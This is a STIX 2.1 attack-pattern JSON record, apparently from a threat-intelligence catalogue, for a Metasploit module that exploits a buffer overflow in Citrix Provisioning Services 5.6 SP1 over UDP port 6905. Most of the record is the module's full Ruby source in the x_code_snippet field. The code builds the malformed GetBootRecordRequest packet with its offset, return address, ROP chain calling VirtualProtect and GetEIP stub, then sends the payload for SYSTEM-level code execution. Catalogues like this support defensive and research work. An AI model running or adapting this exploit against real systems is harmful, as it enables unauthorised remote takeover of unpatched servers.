{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--72653695-54c3-4c9e-a05d-b585e48c5a8b",
    "created": "2024-08-14T16:46:51.562936Z",
    "modified": "2024-08-14T16:46:51.562939Z",
    "name": "Citrix Provisioning Services 5.6 SP1 Streamprocess Opcode 0x40020004 Buffer Overflow",
    "description": " This module exploits a remote buffer overflow in the Citrix Provisioning Services 5.6 SP1 (without Hotfix CPVS56SP1E043) by sending a malformed packet with the opcode 0x40020004 (GetBootRecordRequest) to the 6905/UDP port. The module, which allows code execution under the context of SYSTEM, has been successfully tested on Windows Server 2003 SP2 and Windows XP SP3.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/citrix_streamprocess_get_boot_record_request.rb",
            "external_id": "citrix_streamprocess_get_boot_record_request.rb"
        },
        {
            "source_name": "reference",
            "url": "http://support.citrix.com/article/CTX130846"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Udp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Citrix Provisioning Services 5.6 SP1 Streamprocess Opcode 0x40020004 Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a remote buffer overflow in the Citrix Provisioning Services\n        5.6 SP1 (without Hotfix CPVS56SP1E043) by sending a malformed packet with the opcode\n        0x40020004 (GetBootRecordRequest) to the 6905/UDP port. The module, which allows\n        code execution under the context of SYSTEM, has been successfully tested on Windows Server\n        2003 SP2 and Windows XP SP3.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'alino <26alino[at]gmail.com>', # citrix_streamprocess_data_msg author\n          'juan vazquez'  # Metasploit module\n        ],\n      'References'     =>\n        [\n          ['OSVDB', '75780'],\n          ['BID', '49803'],\n          ['URL', 'http://support.citrix.com/article/CTX130846']\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n        },\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\",\n          'EncoderOptions' => {'BufferRegister'=>'ECX'},\n        },\n      'Platform'       => ['win'],\n      'Targets'        =>\n        [\n          [ 'Citrix Provisioning Services 5.6 SP1',\n            {\n              'Offset' => 2012,\n              'Ret'    => 0x0045403a # ADD ESP,664; RETN 04 streamprocess.exe\n            }\n          ]\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2011-11-04',  #CTX130846 creation date\n      'DefaultTarget'  => 0))\n\n    register_options([Opt::RPORT(6905)])\n  end\n\n  def exploit\n\n    packet =  \"\\x04\\x00\\x02\\x40\" # DATA MSG\n    packet << rand_text_alpha_upper(18)\n    packet << \"\\x00\\x00\\x00\\x00\" # Length\n    packet << rand_text_alpha_upper(target['Offset'])\n    packet << [target.ret].pack('V')\n\n    rop_nop = [0x004a072c].pack('V') * 38 # RETN streamprocess.exe\n\n    rop_gadgets =\n    [\n      0x0045b141, # POP EAX; RETN streamprocess.exe\n      0x1009a1bc, # VirtualProtect()\n      0x00436d44, # MOV EAX,DWORD PTR DS:[EAX]; RETN streamprocess.exe\n      0x004b0bbe, # XCHG EAX,ESI; RETN streamprocess.exe\n      0x004ad0cf, # POP EBP; RETN streamprocess.exe\n      0x00455d9d, # PUSH ESP; RETN streamprocess.exe\n      0x00497f5a, # POP EAX; RETN streamprocess.exe\n      0xfffff9d0, # dwSize\n      0x00447669, # NEG EAX; RETN streamprocess.exe\n      0x004138a7, # ADD EBX,EAX; XOR EAX,EAX; RETN streamprocess.exe\n      0x00426305, # POP ECX; RETN streamprocess.exe\n      0x00671fb9, # lpflOldProtect\n      0x004e41e6, # POP EDI; RETN streamprocess.exe\n      0x0040f004, # RETN streamprocess.exe\n      0x00495c05, # POP EAX; RETN streamprocess.exe\n      0xffffffc0, # flNewProtect\n      0x0042c79a, # NEG EAX; RETN streamprocess.exe\n      0x0049b676, # XCHG EAX,EDX; RETN streamprocess.exe\n      0x0045c1fa, # POP EAX; RETN streamprocess.exe\n      0x90909090, # NOP\n      0x00435bbe, # PUSHAD; RETN streamprocess.exe\n    ].pack(\"V*\")\n\n    packet[386, rop_nop.length] = rop_nop\n    packet[538, rop_gadgets.length] = rop_gadgets\n    # Put payload address in ecx\n    geteip = \"\\xeb\\x03\" # jmp short 0x5\n    geteip << \"\\x59\" # pop ecx\n    geteip << \"\\xff\\xd1\" # call ecx\n    geteip << \"\\xe8\\xf8\\xff\\xff\\xff\" # call to \"pop / call\"\n    packet[622, 10] = geteip\n    packet[632, payload.encoded.length] = payload.encoded\n\n    print_status(\"Trying target #{target.name}...\")\n\n    connect_udp\n    udp_sock.put(packet)\n\n    handler\n    disconnect_udp\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-11-04,  #CTX130846 creation date",
    "x_mitre_platforms": [
        "['win']"
    ]
}